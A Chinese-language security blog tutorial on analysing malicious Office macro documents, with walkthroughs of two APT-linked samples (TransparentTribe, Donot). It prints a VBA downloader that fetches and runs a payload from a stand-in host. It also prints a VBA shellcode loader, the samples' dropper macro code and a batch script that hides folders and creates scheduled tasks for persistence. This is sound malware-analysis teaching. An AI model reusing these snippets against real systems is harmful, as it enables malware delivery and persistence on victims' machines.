> 原文链接: https://www.anquanke.com//post/id/209321 


# 恶意代码分析之Office宏代码分析


                                阅读量   
                                **349397**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">8</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01aa69a859eccb9df9.png)](https://p2.ssl.qhimg.com/t01aa69a859eccb9df9.png)



## 0x00 前言

在之前的文章中，讲述了几个常见的恶意样本的一些常规分析手法。主要使用的工具有exeinfo(查壳)、IDA(静态分析)、od&amp;xdbg32(动态调试)、Systrace&amp;火绒剑(行为分析)等。从本小节开始，文章将讲述不同种类的非PE样本和一些更复杂的PE样本如何调试和分析。关于非PE样本的概述，在之前的文章中已经进行了概要的介绍，目前来讲，非PE样本在攻击链中往往属于重要的部分。在本节中，笔者将详细介绍关于office宏类的非PE样本的分析方法。



## 0x01 Office宏简介

该部分的主要内容来源于19年年底我看到的一个英文论文，原文链接暂时找不到了，后续如果找到了我会贴在评论中。

### <a class="reference-link" name="%E5%9F%BA%E4%BA%8E%E5%AE%8F%E7%9A%84%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8"></a>基于宏的攻击活动

目前利用office宏进行攻击应该是一个比较主流的攻击方式了，但是通常情况下，宏代码并不能很好地实现所有的功能，更多的时候，宏代码都是作为一个加载器或者下载器载攻击中发挥作用的。<br>
有时候，宏代码会直接访问攻击者的C2，下载恶意文件到本地运行。<br>
有时候，宏代码会解密释放出一个powershell代码，再调用powershell脚本，通过powershell脚本去实现环境检测、文件下载等功能。<br>
宏代码基于的是VB的语法，如果没有混淆的宏代码阅读起来倒是比较方便，但是现在的大多数宏样本都会有混淆和一些反调试手法，所以在遇到各类宏代码的时候也要根据情况去分析。

### <a class="reference-link" name="%E4%B8%80%E4%BA%9B%E9%92%9F%E7%88%B1office%E5%AE%8F%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%B6%E6%97%8F"></a>一些钟爱office宏攻击的家族

<a class="reference-link" name="Emotet"></a>**Emotet**

Emotet是一个专注于银行攻击的木马家族，该家族从2014年活跃至今，别是在2019年，每天Emotet都会在全球发送超过十万封钓鱼邮件进行攻击。关于Emotet，是目前比较活跃的银行木马，该组织的攻击样本也比较有特色，之后有机会写一篇文章对该家族的样本进行一个完整的分析。

<a class="reference-link" name="FTCODE"></a>**FTCODE**

一款由宏作为载体，释放powershell实现的勒索软件，活跃至2019年。

<a class="reference-link" name="Sandworm:%20BlackEnergy%20/%20Olympic%20Destroyer"></a>**Sandworm: BlackEnergy / Olympic Destroyer**

sandworm每次攻击的起始都是宏<br>
2015年和2016年两次袭击乌克兰发电厂，导致停电。2018年攻击平昌冬奥会。

<a class="reference-link" name="Other"></a>**Other**

除此之外，还有像Dridex、Rovnix、Vawtrak、FIN4、Locky、APT32、TA505、Hancitor、Trickbot、FIN7、Buran、 Ursni、Gozi,、Dreambot、 TA2101/Maze ransomware、 等家族，都会在攻击过程中使用到带有恶意宏代码的office文档。

### <a class="reference-link" name="%E6%81%B6%E6%84%8F%E5%AE%8F%E5%A6%82%E4%BD%95%E8%BF%90%E8%A1%8C"></a>恶意宏如何运行

先来看一个典型的宏利用文档打开的提示：

[![](https://p4.ssl.qhimg.com/t011498e20fad5f9429.png)](https://p4.ssl.qhimg.com/t011498e20fad5f9429.png)

由于宏的危险性，office通常情况下默认是禁用宏执行的，所以当带有宏的文件打开，就会询问用户是否开启宏，为了让用户在不知情的情况下启用宏，攻击者也是想了很多方式，我大概遇见过这么几种：<br>
1.在文档中间显示一个模糊的图片，提示用户启用宏才能查看清晰图片。<br>
2.在文档中伪造安全的机构，比如伪造微软，或者伪造一个杀软的图标，让用户相信这个文档是安全的。<br>
3.与用户交互，把宏代码的执行设置在用户单击了某个图片或者按钮则提示用户启用宏。

### <a class="reference-link" name="%E6%81%B6%E6%84%8F%E5%AE%8F%E4%BB%A3%E7%A0%81%E9%80%9A%E5%B8%B8%E8%A2%AB%E7%94%A8%E6%9D%A5%E5%81%9A%E4%BB%80%E4%B9%88"></a>恶意宏代码通常被用来做什么

一般来讲，恶意宏代码可以实现以下操作：<br>
Run Automatically 自动运行<br>
Download Files 下载文件<br>
CreateFiles 创建文件<br>
Execute a file 执行、启动文件<br>
Run a system command 执行系统命令<br>
call any dll 调用任意dll<br>
Inject Shellcode 注入shellcode<br>
Call any ActiveXObkject 调用任意的ActiveXObject<br>
Simulate Keystrokes 模拟用户点击<br>
…

需要注意的是，一个恶意程序可能完全由宏实现，但是更多的情况下，宏用于加载或者下载其他恶意程序。所以对于一个未知的office文档来讲，启用office的宏和打开未知的exe文件一样危险：

[![](https://p0.ssl.qhimg.com/t01ee190ee4a663ffe7.png)](https://p0.ssl.qhimg.com/t01ee190ee4a663ffe7.png)

一个简单的VBA Downloader（下载者），有时候也称为Dropper（加载器）示例：

```
private  Declare Function URLDownloadToFileA Lib "urlmon" 
(ByVak A AS Long,ByVal B As String , 
ByVal C As String ,ByVal D As Long ,
ByVal E As Long ) As Long

Sub Auto_Open()
    Dim result As Long
    fname = Environ("TEMP") &amp; "agent.exe" 
    result =URLDownloadToFileA(0,"http:compromised.com/payload.exe",fname,0,0)
    Shell fname
End Sub
```

这里使用的URLDownloadToFileA来自于系统dll urlmon.dll<br>
在第六行定义了名为Auto_Open的函数，该函数在文档打开的时候会自动运行（如果允许文档执行宏）<br>
第八行滴位置，指明了下载文件的存放路径和名称<br>
第9行的地方调用了URLDownloadToFileA函数，下载文件保存到本地<br>
第10行的位置执行下载的payload

### <a class="reference-link" name="%E7%AE%80%E5%8D%95%E7%9A%84%E6%B7%B7%E6%B7%86%E3%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF"></a>简单的混淆、反调试技术

1.利用ActiveX触发器<br>
一个典型的例子：[利用InkPicture1_Painted](http://www.greyhathacker.net/?p=948)<br>
2.隐藏数据<br>
3.用于隐藏数据的Word文档变量，文档变量可以存储多达64KB的数据，隐藏在MS Word用户界面中。<br>
4.通过CallByName混淆函数调用<br>[https://msdn.microsoft.com/en-us/library/office/gg278760.aspx](https://msdn.microsoft.com/en-us/library/office/gg278760.aspx)<br>
5.使用WMI运行命令<br>
6.调用powershell<br>
7.运行VBScript或者Jscript，运行VBS/JS代码而不将文件写入磁盘<br>
可参考文档：[https://docs.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-6.0/aa227637(v=vs.60)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-6.0/aa227637(v=vs.60)?redirectedfrom=MSDN)<br>
代码示例：[https://www.experts-exchange.com/questions/28190006/VBA-ScriptControl-to-run-Java-Script-Function.html](https://www.experts-exchange.com/questions/28190006/VBA-ScriptControl-to-run-Java-Script-Function.html)<br>
8.通过API回调运行shellcode

一例通过VBA运行shellcode的实例：

```
Private Declare Function createMemory Lib "kernel32" Alias "HeapCreate" (ByVal flOptions As Long, ByVal dwInitialSize As Long, ByVal dwMaximumSize As Long) As Long
Private Declare Function allocateMemory Lib "kernel32" Alias "HeapAlloc" (ByVal hHeap As Long, ByVal dwFlags As Long, ByVal dwBytes As Long) As Long
Private Declare Sub copyMemory Lib "ntdll" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal lpCodePageEnumProc As Any, ByVal dwFlags As Any) As Long

Private Sub Document_Open()

Dim shellCode As String
Dim shellLength As Byte
Dim byteArray() As Byte
Dim memoryAddress As Long
Dim zL As Long
zL = 0
Dim rL As Long

shellCode = "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500"

shellLength = Len(shellCode) / 2
ReDim byteArray(0 To shellLength)

For i = 0 To shellLength - 1

    If i = 0 Then
        pos = i + 1
    Else
        pos = i * 2 + 1
    End If
    Value = Mid(shellCode, pos, 2)
    byteArray(i) = Val("&amp;H" &amp; Value)

Next

rL = createMemory(&amp;H40000, zL, zL)
memoryAddress = allocateMemory(rL, zL, &amp;H5000)

copyMemory ByVal memoryAddress, byteArray(0), UBound(byteArray) + 1

executeResult = shellExecute(memoryAddress, zL)

End Sub
```

源代码来自：[http://ropgadget.com/posts/abusing_win_functions.html](http://ropgadget.com/posts/abusing_win_functions.html)<br>
代码的前四行用于引用系统库，调用系统API<br>
16行处是shellcode的十六进制编码，在这个例子中功能是打开计算器。<br>
29行处是将shellcode的十六进制编码转换为二进制数据流<br>
36行处将shellcode copy到了buffer处<br>
38处执行了shellcode

### <a class="reference-link" name="%E5%85%B3%E4%BA%8Eoffice%E7%9A%84%E5%8A%A0%E5%AF%86"></a>关于office的加密

在97到2003版本的时候，文件加密的概念还不流行，那个时候的宏代码几乎从来没有加密过，2007版本之后，才开始通过加密的方式将VBA代码保护起来<br>
分享两个解密的工具：<br>[https://github.com/nolze/msoffcrypto-tool](https://github.com/nolze/msoffcrypto-tool)<br>[https://github.com/herumi/msoffice](https://github.com/herumi/msoffice)

### <a class="reference-link" name="%E5%AE%8F%E4%BB%A3%E7%A0%81%E7%9A%84%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"></a>宏代码的分析工具

1.1. 首先可以使用VBA编辑器（比如在office文档里面按alt + F11），通过VBA编辑器可以很方便的调试和跟踪<br>
这里不得不提一下从VBA编辑器隐藏VBA代码的技巧：[https://github.com/outflanknl/EvilClippy](https://github.com/outflanknl/EvilClippy)

2.olevba：[https://github.com/decalage2/oletools/wiki/olevba](https://github.com/decalage2/oletools/wiki/olevba)<br>
该工具可以有效的提取office文档中的宏代码，需要python环境支持。

[![](https://p5.ssl.qhimg.com/t01af59d3ec461767b0.png)](https://p5.ssl.qhimg.com/t01af59d3ec461767b0.png)

上面这张图列举了olevba所支持的类型，和一些值得关注的地方，比如自动触发代码、一些危险的关键词（Downloads、File writes、Shell execution DLL calls等）、还有一些IOCs

当然很多时候静态分析不能解决问题，还是需要动态分析才能更好地了解恶意代码的功能。这里分享一个软件ViperMonkey：[https://github.com/decalage2/ViperMonkey](https://github.com/decalage2/ViperMonkey)

运行结构如下：

[![](https://p4.ssl.qhimg.com/t016bc78e2cba956388.png)](https://p4.ssl.qhimg.com/t016bc78e2cba956388.png)

### <a class="reference-link" name="mraptor"></a>mraptor

mraptor是github上一个开源的宏代码检测项目<br>[https://github.com/decalage2/oletools/wiki/mraptor](https://github.com/decalage2/oletools/wiki/mraptor)

大概介绍一下原理：<br>
mraptor有三个检测标准，分别是：<br>
A 自动执行（触发器）<br>
W 写入文件系统或内存<br>
X 在VBA上下文外执行文件或任何payload<br>
当某个office宏满足了A条件，那么W和X只要满足任意一条，则会被mraptor标注为恶意。<br>
该项目依赖python环境，用法如下：

```
Usage: mraptor [options] &lt;filename&gt; [filename2 ...]
Options:
  -h, --help            show this help message and exit
  -r                    find files recursively in subdirectories.
  -z ZIP_PASSWORD, --zip=ZIP_PASSWORD
                        if the file is a zip archive, open all files from it,
                        using the provided password (requires Python 2.6+)
  -f ZIP_FNAME, --zipfname=ZIP_FNAME
                        if the file is a zip archive, file(s) to be opened
                        within the zip. Wildcards * and ? are supported.
                        (default:*)
  -l LOGLEVEL, --loglevel=LOGLEVEL
                        logging level debug/info/warning/error/critical
                        (default=warning)
  -m, --matches         Show matched strings.
An exit code is returned based on the analysis result:
 - 0: No Macro
 - 1: Not MS Office
 - 2: Macro OK
 - 10: ERROR
 - 20: SUSPICIOUS
```

如果要扫描单个文件，可以使用如下命令<br>
mraptro file.doc



## 0x02 TransparentTribe的Dropper样本

样本md5:bce8a8ea8d47951abffeec38fbeeeef1<br>
样本app.any.run沙箱链接：[https://app.any.run/tasks/d6d22f4e-0376-49f5-8480-d07489a4e03b/](https://app.any.run/tasks/d6d22f4e-0376-49f5-8480-d07489a4e03b/)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0119cddcec04e4cd71.png)

且从any的沙箱中，我们可以看到，该样本原始类型是xls。

我们将样本下载到本地，然后添加xls后缀打开(本地测试环境为office2013)。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012662a771e6e3ac56.png)

该样本打开之后，没有任何的信息，office官方弹框提示用户选择启用/禁用宏。<br>
这里如果选择禁用的话，那么后续文档将显示为空：

[![](https://p0.ssl.qhimg.com/t01f8fc23da8dad6593.png)](https://p0.ssl.qhimg.com/t01f8fc23da8dad6593.png)

这是攻击者一种迷惑用户的手法，诱导用户第二次重新打开并启用宏：

[![](https://p0.ssl.qhimg.com/t010ec9436631074862.png)](https://p0.ssl.qhimg.com/t010ec9436631074862.png)

翻译后内容大概如下：

[![](https://p2.ssl.qhimg.com/t019bf1edb1c4ea93ac.png)](https://p2.ssl.qhimg.com/t019bf1edb1c4ea93ac.png)

翻译文档内容的意义在于，通常来说，为了隐藏攻击痕迹，攻击者都会使用一个看起来正常的文档以迷惑用户。让用户以为打开的就是正常的文档，当用户认定这是一个正常文档，文档中的内容有”价值”时，往往就不会起疑心，木马就能够长时间的运行在用户的计算机上。所以我们通过文档的内容，通常情况下就可以推测出受攻击的目标。可以在攻击的背景分析中提供一些有用的信息。

我们从该样本的文档内容中大概可以得知此次攻击的目标是国防部，文档中提到了一个[jsls@ddpmod.gov.in](mailto:jsls@ddpmod.gov.in)的邮箱，我们通过对后面域名的查询，基本可以确定该文档是针对印度国防部的攻击文档：

[![](https://p4.ssl.qhimg.com/t01a873f754c0cdeb12.png)](https://p4.ssl.qhimg.com/t01a873f754c0cdeb12.png)

由这个信息，我们也可以大概的对攻击者进行一个猜测。<br>
由攻击目标为印度，根据已有的信息，我们可以找到一些针对印度的攻击组织，如Confucius 、APT36(C-Major、Transparent Tribe)、GravityRAT等。

接下来我们看看具体的恶意宏代码。

在打开的xls文档中，安ALT + F11，即可打开宏窗口，红框中的内容即为该文档的宏对象。

[![](https://p4.ssl.qhimg.com/t01c97da24c9cc51d5d.png)](https://p4.ssl.qhimg.com/t01c97da24c9cc51d5d.png)

依次展开选项卡，可以看到有两个对象有数据，一个是名为UserForm1的窗体，一个是名为Module1的模块

[![](https://p1.ssl.qhimg.com/t012842434e6c4300ad.png)](https://p1.ssl.qhimg.com/t012842434e6c4300ad.png)

我们直接将鼠标光标定位到右边的Module1模块中，然后按下键盘的F8，开始调试。<br>
在通过office调试宏代码时，调试的快捷键和od、x64dbg这种调试器有部分区别，具体如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01543e4b74c4677efc.png)

这里F8类似于od中的F7，会逐语句执行代码，当遇到函数调用时，F8会跟进到函数内部。

逐过程Shift + F8相当于od中的F8，遇到函数调用时，将会直接执行完函数而不进入函数。

运行到光标处 Ctrl + F8 相当于od中的F4

此外，在宏调试器中，设置断点是F9，运行程序是F5。所以我们之后在调试宏代码时，我们也可以直接在某行代码设置断点，然后F5运行到断点处。

我们这里直接F8就是在当前的模块窗口中，开始调试宏代码，调试的方式是单步运行。

通常来说，F8运行之后，程序就会停在该模块的入口点。标黄显示，并且在最下面的本地窗口中会显示一些将要使用到的变量。

[![](https://p5.ssl.qhimg.com/t01af4a8ae2244f6102.png)](https://p5.ssl.qhimg.com/t01af4a8ae2244f6102.png)

有时候不小心关闭了本地窗口，我们需要在视图窗口中重新打开。

[![](https://p4.ssl.qhimg.com/t019184b9eb48884a49.png)](https://p4.ssl.qhimg.com/t019184b9eb48884a49.png)

接下来我们来看看代码，既然是调试VBA的代码，我们需要先对VBA的语法有个认识。比如应该知道Dim用于定义变量。<br>
在代码最开始，程序定义了多个变量

```
Dim path_Aldi_file As String
    Dim file_Aldi_name  As String
    Dim zip_Aldi_file  As Variant
    Dim fldr_Aldi_name  As Variant

    Dim byt() As Byte

    Dim ar1Aldi() As String
```

然后通过<br>
file_Aldi_name = “rlbwrarhsa”<br>
对file_Aldi_name进行了赋值。

通过<br>
fldr_Aldi_name = Environ$(“ALLUSERSPROFILE”) &amp; “Tdlawis”<br>
对fldr_Aldi_name进行赋值。<br>
其中，Environ$(“ALLUSERSPROFILE”) 表示获取%ALLUSERSPROFILE%环境变量，&amp;符号表示拼接。<br>
所以该语句运行完之后，fldr_Aldi_name = %ALLUSERSPROFILE%Tdlawis<br>
当然，我们也可以直接按F8单步往下走，在调试器中查看对应的值，这是最快的方法。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01db1dbbf5e1aea2e2.png)

接下来，程序通过VBA的Dir方法判断上面的fldr_Aldi_name路径是否存在，如果不存在则通过MkDir创建该路径。

```
If Dir(fldr_Aldi_name, vbDirectory) = "" Then
   MkDir (fldr_Aldi_name)
End If
```

Tdlawis路径创建成功之后，程序将对fldrz_Aldi_name 重新赋值，并且通过同样的手法尝试创建%ALLUSERSPROFILE%Dlphaws路径。

```
fldrz_Aldi_name = Environ$("ALLUSERSPROFILE") &amp; "Dlphaws"

    If Dir(fldrz_Aldi_name, vbDirectory) = "" Then
        MkDir (fldrz_Aldi_name)
    End If
```

接下来程序通过<br>
zip_Aldi_file = fldrz_Aldi_name &amp; “omthrpa.zip”<br>
声明一个zip路径，路径应该为%ALLUSERSPROFILE%Dlphawsomthrpa.zip

通过<br>
path_Aldi_file = fldr_Aldi_name &amp; file_Aldi_name &amp; “.exe”<br>
声明一个path路径，路径应该为：%ALLUSERSPROFILE%Tdlawisrlbwrarhsa.exe

[![](https://p3.ssl.qhimg.com/t01f02cee5734455333.png)](https://p3.ssl.qhimg.com/t01f02cee5734455333.png)

接下来，程序通过Application.OperatingSystem获取当前操作系统的版本并根据不同的情况进行不同的处理，如果当前系统版本为6.02或6.03，程序将获取UserForm1.TextBox2.Text的信息赋值给ar1Aldi。否则获取UserForm1.TextBox1.Text的内容赋值给ar1Aldi。

```
If InStr(Application.OperatingSystem, "6.02") &gt; 0 Or InStr(Application.OperatingSystem, "6.03") &gt; 0 Then
        ar1Aldi = Split(UserForm1.TextBox2.Text, ":")
    Else
        ar1Aldi = Split(UserForm1.TextBox1.Text, ":")
    End If
```

关于获取操作系统版本信息的文档，可在[这里](https://docs.microsoft.com/zh-cn/office/vba/api/excel.application.operatingsystem)找到。

操作系统判断完成之后，程序就会将我们之前看到的窗体中的数据赋值给ar1Aldi变量：

[![](https://p2.ssl.qhimg.com/t01f22690dbe6526e1e.png)](https://p2.ssl.qhimg.com/t01f22690dbe6526e1e.png)

然后通过一个for each循环对刚才赋值的ar1Aldi进行解密：

```
For Each vl In ar1Aldi
        ReDim Preserve btsAldi(linAldi)

        btsAldi(linAldi) = CByte(vl)

        linAldi = linAldi + 1
    Next
```

然后我们可以直接光标定位到循环后面的代码，按Ctrl + F8 跑完循环

[![](https://p0.ssl.qhimg.com/t01d80dc3673bf8ad2a.png)](https://p0.ssl.qhimg.com/t01d80dc3673bf8ad2a.png)

这里我们可以看到，程序会通过二进制流的方式打开zip_Aldi_file，也就是先前定义的zip文件，然后将刚才的btsAldi进行写入。

```
Open zip_Aldi_file For Binary Access Write As #2
         Put #2, , btsAldi
    Close #2
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01a938887ee337a5ad.png)

写入成功之后，程序会尝试将该zip包进行解压。

```
If Len(Dir(path_Aldi_file)) = 0 Then
        Call unAldizip(zip_Aldi_file, fldr_Aldi_name)
    End If
```

解压的文件是zip_Aldi_file，解压的路径是fldr_Aldi_name<br>
解压成功后将会在fldr_Aldi_name目录下出现目标文件：

[![](https://p5.ssl.qhimg.com/t017612f3960886dd9d.png)](https://p5.ssl.qhimg.com/t017612f3960886dd9d.png)

最后程序通过<br>
Shell path_Aldi_file, vbNormalNoFocus<br>
启动该exe，程序即从xls文件成功转入到了exe文件运行。<br>
由于该exe由C#编写，是一个Crimson远控，关于该类木马的分析，将在后续的文章中进行介绍。

从这个样本中，我们初步了解了office宏代码的攻击方式。<br>
1.诱导用户启用宏，诱导方式，如果不启用宏，xls文档打开之后将不现实任何内容<br>
2.将预定义的zip数据流简单转换之后写入到窗体中<br>
3.根据操作系统版本的不同，取窗体中不同的值<br>
4.将取出来的数据进行简单变换之后还原为zip文件<br>
5.解压zip文件得到一个Crimson远控<br>
6.运行该远控



## 0x03 donot恶意文档分析

样本md5：4428912f168f3f1f0554126de7b4eced<br>
any沙箱连接为：<br>[https://app.any.run/tasks/2d9a7598-47d9-46a9-9d03-9b3ece716fa6/](https://app.any.run/tasks/2d9a7598-47d9-46a9-9d03-9b3ece716fa6/)

同样的，通过any沙箱，我们可以得知该样本还是一个xls文档，我们将样本下载到本地并添加xls后缀打开。<br>
同样的弹出了禁用宏的提示框：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ac540bfe99ccfe8a.png)

启用宏之后，程序看起来是报错了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t018a620cb6354715d0.png)

之前的经验告诉我们，这样的弹框信不得，我们单击确定之后，还是通过ALT + F11打开宏调试窗口，单击左边的对象时，发现该文档有密码保护：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c7259e160f7164d0.png)

通过之前介绍的工具，将密码去除之后重新打开，得到对象列表如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01daa364fb99b13314.png)

我们通过观察，可以得知关键的代码在名为ThisWorkbook的对象中：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0138e4808312fb6396.png)

同样的，我们对该段代码进行调试分析。<br>
代码开头还是通过Dim定义了几个变量，然后通过Environ获取了环境变量APPDAT和TEMP的路径分别赋值给Digital和request<br>
Digital = Environ$(“APPDATA”)<br>
request = Environ$(“TEMP”)

接着通过<br>
Application.Wait Now + TimeValue(“0:00:03”)<br>
休眠3秒

休眠之后通过<br>
a = MsgBox(“Microsoft Excel has stopped working”, vbCritical, “Warning”)<br>
进行弹框，弹框内容就是我们先前看到的提示框，这就是第二种迷惑用户的手法。<br>
在上一个样本中，恶意宏代码运行之后，程序会显示一个看起来正常的xls文档以消除用户的疑心。在本样本中，恶意代码运行之后，程序是通过弹框提示用户文档打开错误以消除用户的疑心。两种方法的目标都在于，让用户误以为，打开的文档是没有问题的。

弹框之后，程序会通过<br>
sunjava = “Scr” + “ipting.File” + “System” + “Object”<br>
Set digit = CreateObject(sunjava)<br>
创建一个Scripting.FileSystemObject对象

接着程序将通过

```
Sheet12.OLEObjects("Object 1").Copy
Sheet8.OLEObjects("Object 1").Copy
digit.CopyFile request &amp; "Vol", Digital &amp; "s.bat" 'FileFormat:=xlOpenXMLWorkbook
digit.CopyFile request &amp; "s", Digital &amp; "s" 'FileFormat:=xlOpenXMLWorkbook
```

分别将sheet中的数据拷贝到Digital，也就是%appdata%中并且命名为s和s.bat

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01133edea2620486b5.png)

然后通过<br>
https = Digital &amp; “” &amp; “s.bat”<br>
Call Shell(https, vbHide)<br>
拼接s.bat的路径并且再次通过Shell指令运行。

至此宏代码运行完成。

我们可以看到，在该样本中，宏代码很短，宏代码的功能位<br>
1.弹框迷惑用户<br>
2.释放一个S文件，经查看为一个PE文件<br>
3.释放一个s.bat批处理文件<br>
4.调用执行s.bat文件

到这里我们也可以猜测出，s.bat文件将用于调用执行s文件。

我们查看一下s.bat的内容：

```
echo off
md %USERPROFILE%InetLogsCust
md %USERPROFILE%InetLogsPool
md %USERPROFILE%CommonBuildOffice
md %USERPROFILE%FilesSharedWeb
md %USERPROFILE%ViewerInformationPolicy
attrib +a +h +s %USERPROFILE%Inet
attrib +a +h +s %USERPROFILE%Common
attrib +a +h +s %USERPROFILE%Files
attrib +a +h +s %USERPROFILE%Viewer
del /f %USERPROFILE%InetLogsPoolagnia
SET /A %COMPUTERNAME%
SET /A RAND=%RANDOM% 10000 + 2
echo %COMPUTERNAME%-%RAND% &gt;&gt; %USERPROFILE%InetLogsPoolagnia
schtasks /delete /tn Feed /f
schtasks /delete /tn Sys_Core /f
schtasks /create /sc minute /mo 10 /f /tn Sys_Core /tr %USERPROFILE%FilesSharedWebgapdat.exe
schtasks /create /sc minute /mo 30 /f /tn Feed /tr "rundll32.exe '%USERPROFILE%ViewerInformationPolicysqmap.dll', calldll"
move %AppData%s %USERPROFILE%ViewerInformationPolicy
ren %USERPROFILE%ViewerInformationPolicys sqmap.dll
del %0
```

bat文件的语法还是比较简单明了的，通过bat的内容，我们可以得知程序获取了计算机的COMPUTERNAME和一个随机值写入到了%USERPROFILE%InetLogsPoolagnia，然后程序设置了两个计划任务，并且将%appdata%下的s文件移动到了%USERPROFILE%ViewerInformationPolicys并重命名为sqmap.dll

计划任务1：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012c47a66cf4db4781.png)

计划任务2：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0122061dcf5e4d9b6a.png)

我们查看计划任务1所指定的目录文件可以发现暂时是0kb

[![](https://p0.ssl.qhimg.com/t0187813d5e8d7464cd.png)](https://p0.ssl.qhimg.com/t0187813d5e8d7464cd.png)

查看计划任务2所指定的任务，可以看到文件已经成功移动过来：

[![](https://p3.ssl.qhimg.com/t014c4fc84935bb47bc.png)](https://p3.ssl.qhimg.com/t014c4fc84935bb47bc.png)

通过hash查询可以确定s和sqmap.dll是同一个文件：

